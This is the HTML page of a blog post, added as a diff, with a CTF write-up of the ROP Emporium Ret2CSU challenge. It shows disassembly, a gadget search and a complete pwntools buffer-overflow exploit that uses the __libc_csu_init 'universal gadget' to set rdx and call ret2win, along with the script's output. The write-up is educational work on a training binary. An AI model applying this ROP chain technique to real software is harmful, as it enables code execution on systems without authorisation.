@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>ROP Emporium Ret2CSU Writeup :: Adam Gold — Writing about security and programming</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Last ROP Emporium callenge - Ret2CSU! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.
+Our goal is to call the ret2win function with rdx filled with 0xdeadcafebabebeef. As mentioned before, the main challenge here is having no gadgets allowing us to directly control rdx.
+pwndbg&amp;gt; checksec [*] &amp;#39;/home/adamgold/Desktop/ctfs/ret2csu/ret2csu&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) pwndbg&amp;gt; disass main Dump of assembler code for function main: 0x00000000004006d7 &amp;lt;&#43;0&amp;gt;:	push rbp 0x00000000004006d8 &amp;lt;&#43;1&amp;gt;:	mov rbp,rsp 0x00000000004006db &amp;lt;&#43;4&amp;gt;:	mov rax,QWORD PTR [rip&#43;0x20097e] # 0x601060 &amp;lt;stdout@@GLIBC_2."/>
+<meta name="keywords" content="blog, security, programming, python, developer"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://adamgold.github.io/posts/ropemporium-ret2csu/" />
+
+
+<base href="https://adamgold.github.io/posts/ropemporium-ret2csu/">
+<meta name="url" content="https://adamgold.github.io/posts/ropemporium-ret2csu/" />
+<meta property="og:locale" content="en">
+
+ 
+  <title itemprop="name">ROP Emporium Ret2CSU Writeup | Adam Gold</title>
+  <meta itemprop="name" content="ROP Emporium Ret2CSU Writeup | Adam Gold" />
+  <meta name="description" content="Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`." />
+  <meta itemprop="description" content="Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`." />
+  
+  
+  
+
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="https://adamgold.github.io/" />
+  <meta property="article:publisher" content="" /> 
+  <meta property="og:article:published_time" content=2020-01-04T21:28:48&#43;0300 /> 
+  <meta property="article:published_time" content=2020-01-04T21:28:48&#43;0300 />
+  
+  
+  
+  
+
+
+
+<script type="text/javascript" src="/scripts/global.js"></script><script type="application/ld+json">
+	
+	{
+	  "@context": "https://schema.org",
+	  "@type": "BlogPosting",
+	  "headline": "ROP Emporium Ret2CSU Writeup",
+	  "image": "https://adamgold.github.io/",
+	  "datePublished": "2020-01-04T21:28:48+03:00",
+	  "dateModified": "2020-01-04T21:28:48+03:00",
+	  "author": {
+	    "@type": "Person",
+	    "name": "Adam Gold"
+	  },
+	  "mainEntityOfPage": { "@type": "WebPage" },
+	  "description": "Last ROP Emporium callenge - Ret2CSU! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.\nOur goal is to call the ret2win function with rdx filled with 0xdeadcafebabebeef. As mentioned before, the main challenge here is having no gadgets allowing us to directly control rdx.\npwndbg\u0026gt; checksec [*] \u0026#39;/home/adamgold/Desktop/ctfs/ret2csu/ret2csu\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) pwndbg\u0026gt; disass main Dump of assembler code for function main: 0x00000000004006d7 \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004006d8 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004006db \u0026lt;+4\u0026gt;:\tmov rax,QWORD PTR [rip+0x20097e] # 0x601060 \u0026lt;stdout@@GLIBC_2.",
+	  "keywords": ["binary-exploitation", "pwning", "rop"]
+	}
+	
+	{
+	  "@context": "https://schema.org",
+	  "@type": "Organization",
+	  "name": "Adam Gold - Writing about security and programming",
+	  "url": "https://adamgold.github.io/",
+	  "sameAs": [
+	    "https://twitter.com/adamgolds",
+	    "https://github.com/adamgold"
+	  ]
+	}
+</script>
+
+
+
+
+<link rel="stylesheet" href="https://adamgold.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://adamgold.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://adamgold.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://adamgold.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ROP Emporium Ret2CSU Writeup"/>
+<meta name="twitter:description" content="Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`."/>
+
+
+
+<meta property="og:title" content="ROP Emporium Ret2CSU Writeup" />
+<meta property="og:description" content="Last ROP Emporium callenge - [Ret2CSU](https://ropemporium.com/challenge/ret2csu.html)! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us. Our goal is to call the `ret2win` function with `rdx` filled with `0xdeadcafebabebeef`. As mentioned before, the main challenge here is having no gadgets allowing us to directly control `rdx`." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://adamgold.github.io/posts/ropemporium-ret2csu/" />
+<meta property="article:published_time" content="2020-01-04T21:28:48+03:00" />
+<meta property="article:modified_time" content="2020-01-04T21:28:48+03:00" /><meta property="og:site_name" content="Adam Gold" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Gold</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/AdamGold">GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/AdamGold">GitHub</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/adamgold7/">LinkedIn</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="https://adamgold.github.io/posts/ropemporium-ret2csu/">ROP Emporium Ret2CSU Writeup</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-01-04
+        </span>
+
+        
+          
+        
+      
+
+      
+      
+        <span class="post-read-time">— 5 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="https://adamgold.github.io/tags/binary-exploitation/">binary-exploitation</a>&nbsp;
+        
+          #<a href="https://adamgold.github.io/tags/pwning/">pwning</a>&nbsp;
+        
+          #<a href="https://adamgold.github.io/tags/rop/">rop</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Last ROP Emporium callenge - <a href="https://ropemporium.com/challenge/ret2csu.html">Ret2CSU</a>! This challenge requires a usage of something called Universal Gadget, that will allow us to use three parameters to functions calls, when we do not have any useful gadgets available to us.</p>
+<p>Our goal is to call the <code>ret2win</code> function with <code>rdx</code> filled with <code>0xdeadcafebabebeef</code>. As mentioned before, the main challenge here is having no gadgets allowing us to directly control <code>rdx</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pwndbg&gt; checksec
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/adamgold/Desktop/ctfs/ret2csu/ret2csu&#39;</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+
+pwndbg&gt; disass main
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+   0x00000000004006d7 &lt;+0&gt;:	push   rbp
+   0x00000000004006d8 &lt;+1&gt;:	mov    rbp,rsp
+   0x00000000004006db &lt;+4&gt;:	mov    rax,QWORD PTR <span style="color:#f92672">[</span>rip+0x20097e<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x601060 &lt;stdout@@GLIBC_2.2.5&gt;</span>
+   0x00000000004006e2 &lt;+11&gt;:	mov    ecx,0x0
+   0x00000000004006e7 &lt;+16&gt;:	mov    edx,0x2
+   0x00000000004006ec &lt;+21&gt;:	mov    esi,0x0
+   0x00000000004006f1 &lt;+26&gt;:	mov    rdi,rax
+   0x00000000004006f4 &lt;+29&gt;:	call   0x4005e0 &lt;setvbuf@plt&gt;
+   0x00000000004006f9 &lt;+34&gt;:	mov    edi,0x4008c8
+   0x00000000004006fe &lt;+39&gt;:	call   0x400590 &lt;puts@plt&gt;
+   0x0000000000400703 &lt;+44&gt;:	mov    eax,0x0
+   0x0000000000400708 &lt;+49&gt;:	call   0x400714 &lt;pwnme&gt;
+   0x000000000040070d &lt;+54&gt;:	mov    eax,0x0
+   0x0000000000400712 &lt;+59&gt;:	pop    rbp
+   0x0000000000400713 &lt;+60&gt;:	ret
+End of assembler dump.
+pwndbg&gt; disass pwnme
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> pwnme:
+   0x0000000000400714 &lt;+0&gt;:	push   rbp
+   0x0000000000400715 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000400718 &lt;+4&gt;:	sub    rsp,0x20
+   0x000000000040071c &lt;+8&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>
+   0x0000000000400720 &lt;+12&gt;:	mov    edx,0x20
+   0x0000000000400725 &lt;+17&gt;:	mov    esi,0x0
+   0x000000000040072a &lt;+22&gt;:	mov    rdi,rax
+   0x000000000040072d &lt;+25&gt;:	call   0x4005c0 &lt;memset@plt&gt;
+   0x0000000000400732 &lt;+30&gt;:	mov    edi,0x4008e1
+   0x0000000000400737 &lt;+35&gt;:	call   0x400590 &lt;puts@plt&gt;
+   0x000000000040073c &lt;+40&gt;:	mov    edi,0x4008f0
+   0x0000000000400741 &lt;+45&gt;:	call   0x400590 &lt;puts@plt&gt;
+   0x0000000000400746 &lt;+50&gt;:	mov    edi,0x400924
+   0x000000000040074b &lt;+55&gt;:	call   0x400590 &lt;puts@plt&gt;
+   0x0000000000400750 &lt;+60&gt;:	mov    edi,0x400925
+   0x0000000000400755 &lt;+65&gt;:	mov    eax,0x0
+   0x000000000040075a &lt;+70&gt;:	call   0x4005b0 &lt;printf@plt&gt;
+   0x000000000040075f &lt;+75&gt;:	mov    eax,0x601018
+   0x0000000000400764 &lt;+80&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>,0x0
+   0x000000000040076b &lt;+87&gt;:	mov    eax,0x601028
+   0x0000000000400770 &lt;+92&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>,0x0
+   0x0000000000400777 &lt;+99&gt;:	mov    eax,0x601030
+   0x000000000040077c &lt;+104&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>,0x0
+   0x0000000000400783 &lt;+111&gt;:	mov    rdx,QWORD PTR <span style="color:#f92672">[</span>rip+0x2008e6<span style="color:#f92672">]</span>        <span style="color:#75715e"># 0x601070 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+   0x000000000040078a &lt;+118&gt;:	lea    rax,<span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>
+   0x000000000040078e &lt;+122&gt;:	mov    esi,0xb0
+   0x0000000000400793 &lt;+127&gt;:	mov    rdi,rax
+   0x0000000000400796 &lt;+130&gt;:	call   0x4005d0 &lt;fgets@plt&gt;
+   0x000000000040079b &lt;+135&gt;:	mov    eax,0x601038
+   0x00000000004007a0 &lt;+140&gt;:	mov    QWORD PTR <span style="color:#f92672">[</span>rax<span style="color:#f92672">]</span>,0x0
+   0x00000000004007a7 &lt;+147&gt;:	mov    rdi,0x0
+   0x00000000004007ae &lt;+154&gt;:	nop
+   0x00000000004007af &lt;+155&gt;:	leave
+   0x00000000004007b0 &lt;+156&gt;:	ret
+End of assembler dump.
+</code></pre></div><p>Looking at the disassembly, this challenge is pretty much the same as earlier challenges. We need to overflow the buffer in <code>pwnme</code>, return to <code>ret2win</code> BUT change <code>rdx</code> first. Let&rsquo;s hunt for gadgets:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adamgold@adamgold-VirtualBox:~/Desktop/ctfs/ret2csu$ ropper --file ret2csu --search <span style="color:#e6db74">&#34;pop rdx&#34;</span>
+<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Load gadgets from cache
+<span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> loading... 100%
+<span style="color:#f92672">[</span>LOAD<span style="color:#f92672">]</span> removing double gadgets... 100%
+<span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> gadgets: pop rdx
+</code></pre></div><p>I tried searching for more rdx-related gadgets but could not find any. After struggling with this for some time, I discovered something I was unfamiliar with - <a href="https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html">Universal gadgets</a>.</p>
+<blockquote>
+<p>__libc_csu_init functions provides a few nice gadgets to load data into certain critical registers. Most importantly EDI, RSI and RDX.</p>
+</blockquote>
+<p>That&rsquo;s perfect! Let&rsquo;s get these gadgets from the disassembly of the file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">objdump -d ./ret2csu -M intel
+
+<span style="color:#ae81ff">0000000000400840</span> :
+
+400880:    4c <span style="color:#ae81ff">89</span> fa                 mov    rdx,r15
+
+  400883:    4c <span style="color:#ae81ff">89</span> f6                 mov    rsi,r14
+
+  400886:    <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">89</span> ef                 mov    edi,r13d
+
+  400889:    <span style="color:#ae81ff">41</span> ff <span style="color:#ae81ff">14</span> dc              call   QWORD PTR <span style="color:#f92672">[</span>r12+rbx*8<span style="color:#f92672">]</span>
+
+  40088d:    <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">83</span> c3 01              add    rbx,0x1
+
+  400891:    <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">39</span> dd                 cmp    rbp,rbx
+
+  400894:    <span style="color:#ae81ff">75</span> ea                    jne    <span style="color:#ae81ff">400880</span>
+
+  400896:    <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">83</span> c4 08              add    rsp,0x8
+
+  .........
+
+
+  40089a:    5b                       pop    rbx
+
+  40089b:    5d                       pop    rbp
+
+  40089c:    <span style="color:#ae81ff">41</span> 5c                    pop    r12
+
+  40089e:    <span style="color:#ae81ff">41</span> 5d                    pop    r13
+
+  4008a0:    <span style="color:#ae81ff">41</span> 5e                    pop    r14
+
+  4008a2:    <span style="color:#ae81ff">41</span> 5f                    pop    r15
+
+  4008a4:    c3                       ret
+</code></pre></div><p>This allows us to move r15 into <code>rdx</code> - But, then there&rsquo;s a call to <code>[r12+rbx*8]</code> and a <code>cmp</code> instruction right after. We&rsquo;re going to need to use the second section of gadgets shown above to control <code>r12</code> and <code>rbx</code>, so these instructions won&rsquo;t get in our way.</p>
+<p>Here&rsquo;s another useful quote from the article linked to above:</p>
+<blockquote>
+<p>To effectively use mov rdx,r13 , we have to ensure that <code>call QWORD PTR [r12+rbx*8]</code> doesn&rsquo;t SIGSEGV, <code>cmp rbx,rbp</code> equals and most importantly value of <code>RDX</code> is not altered.</p>
+</blockquote>
+<p>Also noted in the article is that it&rsquo;s possible to use pointers for the <code>_init</code> function, located at <code>&amp;_DYNAMIC</code>. That&rsquo;s just what we need for <code>r12</code>, as we&rsquo;ll zero <code>rbx</code> - <code>call [_init+0*8]</code>.</p>
+<pre><code>pwndbg&gt; x/10gx &amp;_DYNAMIC
+
+0x600e20:    0x0000000000000001    0x0000000000000001
+
+0x600e30:    0x000000000000000c    0x0000000000400560
+
+0x600e40:    0x000000000000000d    0x00000000004008b4
+
+0x600e50:    0x0000000000000019    0x0000000000600e10
+
+0x600e60:    0x000000000000001b    0x0000000000000008
+
+</code></pre><p><code>0x600e48</code> contains an address to <code>0x00000000004008b4</code>:</p>
+<pre><code>pwndbg&gt; x/4i 0x00000000004008b4
+
+   0x4008b4 :    sub    rsp,0x8
+
+   0x4008b8 :    add    rsp,0x8
+
+   0x4008bc :    ret
+</code></pre><p>Remember that after the call instruction, the program will again pop all registers until reaching the ret instruction. Also, we have <code>add rsp, 0x8</code> meaning we need another dummy in the stack. Also, <code>rbp</code> and <code>rbx</code> must not be equal (because of the <code>cmp</code> instruction)!</p>
+<h3 id="summing-up">Summing Up</h3>
+<p>Here&rsquo;s the plan:</p>
+<ul>
+<li>Call first gadget at <code>0x0040089a</code>.</li>
+<li>Pop all desired values.</li>
+<li>Register R12 = pointer to <code>__init</code> address.</li>
+<li>Register R15 = <code>0xdeadcafebabebeef</code>.</li>
+<li>Register <code>RBX = 0x0</code> while <code>RBP = 0x01</code>.</li>
+<li>Use second gadget at address 0x400880 that will put the values at correct registers.</li>
+<li>Place the address of ret2win function in the stack.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+ret2win <span style="color:#f92672">=</span><span style="color:#ae81ff">0x00000000004007b1</span>
+rdx_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadcafebabebeef</span>
+pop_rbx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040089a</span>
+mov_rdx_r15 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400880</span>
+dynamic <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600e48</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./ret2csu&#34;</span>)
+    pause()
+
+    p<span style="color:#f92672">.</span>recvrepeat(<span style="color:#ae81ff">0.2</span>)
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;sending buffer overflow&#34;</span>)
+
+    rop <span style="color:#f92672">=</span> p64(pop_rbx) <span style="color:#75715e"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># rbp=0x0</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># so rbp won&#39;t equal rbx (cmp rbp, rbx must be false)</span>
+    rop <span style="color:#f92672">+=</span> p64(dynamic) <span style="color:#75715e"># r12</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># r13</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># r14</span>
+    rop <span style="color:#f92672">+=</span> p64(rdx_val) <span style="color:#75715e"># r15 - our desired rbp value!</span>
+    rop <span style="color:#f92672">+=</span> p64(mov_rdx_r15)  <span style="color:#75715e"># popping everything again - mov rdx, r15; mov rsi, r14; mov rdi, r13d; call [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 400880; add rsp, 0x8;</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># because of add rsp,0x8 padding - this is a dummy</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>)  <span style="color:#75715e"># rbx</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># rbp</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># r12</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># r13</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># r14</span>
+    rop <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)  <span style="color:#75715e"># r15</span>
+    rop <span style="color:#f92672">+=</span> p64(ret2win)
+
+    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> rop)
+
+    log<span style="color:#f92672">.</span>success(p<span style="color:#f92672">.</span>recvall())
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    exploit()
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">adamgold<span style="color:#a6e22e">@adamgold</span><span style="color:#f92672">-</span>VirtualBox:<span style="color:#f92672">~/</span>Desktop<span style="color:#f92672">/</span>ctfs<span style="color:#f92672">/</span>ret2csu<span style="color:#960050;background-color:#1e0010">$</span> python exp<span style="color:#f92672">.</span>py
+[<span style="color:#f92672">+</span>] Starting local process <span style="color:#e6db74">&#39;./ret2csu&#39;</span>: pid <span style="color:#ae81ff">2046</span>
+<span style="color:#ae81ff">2046</span>
+[<span style="color:#f92672">*</span>] sending buffer overflow
+[<span style="color:#f92672">+</span>] Receiving all data: Done (<span style="color:#ae81ff">33</span>B)
+[<span style="color:#f92672">*</span>] Process <span style="color:#e6db74">&#39;./ret2csu&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> (SIGSEGV) (pid <span style="color:#ae81ff">2046</span>)
+[<span style="color:#f92672">+</span>] ROPE{<span style="color:#f92672">********</span>}
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://adamgold.github.io/posts/python-hash-tables-under-the-hood/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Python Hash Tables Under the Hood</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://adamgold.github.io/posts/ropemporium-pivot/">
+                  <span class="button__text">ROP Emporium Pivot Writeup</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "adam-gold" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">Adam Gold</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://adamgold.github.io/assets/main.js"></script>
+<script src="https://adamgold.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171406341-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+  </body>
+</html>
